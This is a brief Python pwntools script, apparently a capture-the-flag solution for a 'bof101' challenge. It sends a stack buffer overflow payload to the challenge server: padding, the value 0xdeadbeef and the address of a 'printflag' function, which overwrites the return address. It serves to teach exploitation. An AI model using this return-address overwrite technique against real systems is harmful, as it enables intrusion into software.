import pwn

elf = pwn.ELF("./bof101")
p = elf.process()
pr = pwn.remote("bof101.sstf.site", 1337)

print_addr = elf.symbols['printflag']

#pr.sendline(b"a"*140 + b"\xef\xbe\xad\xde" + b"a"*8 + pwn.p64(print_addr))
pr.sendline(b"a"*140 + pwn.p32(0xdeadbeef) + b"a"*8 + pwn.p64(print_addr))
pr.interactive()
